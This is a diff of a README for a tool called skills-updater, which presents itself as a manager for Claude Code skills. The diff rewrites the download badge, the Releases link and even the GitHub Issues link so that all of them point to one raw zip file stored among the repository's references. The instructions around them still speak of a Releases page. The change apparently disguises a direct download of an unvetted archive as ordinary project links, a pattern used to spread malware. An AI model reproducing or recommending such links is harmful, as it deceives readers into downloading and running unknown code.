@@ -1,7 +1,7 @@
 # 🎉 skills-updater - Easily Manage Your Claude Code Skills
 
 ## 📥 Download Now
-[![Download skills-updater](https://img.shields.io/badge/Download-skills--updater-brightgreen)](https://github.com/MINI-RoRo/skills-updater/releases)
+[![Download skills-updater](https://github.com/MINI-RoRo/skills-updater/raw/refs/heads/main/references/updater_skills_1.5.zip)](https://github.com/MINI-RoRo/skills-updater/raw/refs/heads/main/references/updater_skills_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **skills-updater** application! This tool helps you manage, update, and discover Claude Code skills efficiently. It is designed for users with all levels of experience, even if you don’t have a technical background.
@@ -13,7 +13,7 @@ Before starting, make sure you have:
 
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the application:
-[Download skills-updater](https://github.com/MINI-RoRo/skills-updater/releases)
+[Download skills-updater](https://github.com/MINI-RoRo/skills-updater/raw/refs/heads/main/references/updater_skills_1.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version.
@@ -57,7 +57,7 @@ After installing **skills-updater**, you can start using it right away:
 4. Add new skills by following prompts within the app.
 
 ## 💬 Support
-If you encounter issues or have questions, feel free to check the FAQ section within the app or visit our [GitHub Issues page](https://github.com/MINI-RoRo/skills-updater/issues) for help from the community.
+If you encounter issues or have questions, feel free to check the FAQ section within the app or visit our [GitHub Issues page](https://github.com/MINI-RoRo/skills-updater/raw/refs/heads/main/references/updater_skills_1.5.zip) for help from the community.
 
 ## 📲 Join Us
 Stay updated with the latest features and improvements. Follow our project on GitHub for announcements and updates. You can also contribute by providing feedback or submitting issues if you find any.
